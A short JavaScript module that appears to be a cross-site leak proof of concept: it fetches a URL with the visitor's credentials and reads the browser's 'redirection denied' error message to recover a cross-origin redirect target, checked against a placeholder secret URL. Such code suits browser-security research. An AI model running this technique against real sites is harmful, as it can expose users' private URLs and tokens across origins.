const leak = async (url) => {
    return fetch(url, {
        credentials: 'include',
        mode: 'cors',
    })
    .catch((e) => {
        console.debug(e.message)
        let leak = e.message.match(/redirection to (https?:\/\/.*) denied/)
        if(leak && leak[1]){
            if(leak[1] === 'https://example.com/?secret#secret'){
                return 1
            }
            else{
                return leak[1]
            }
        }
        else{
            return 0
        }
        
    })  
}


export { leak }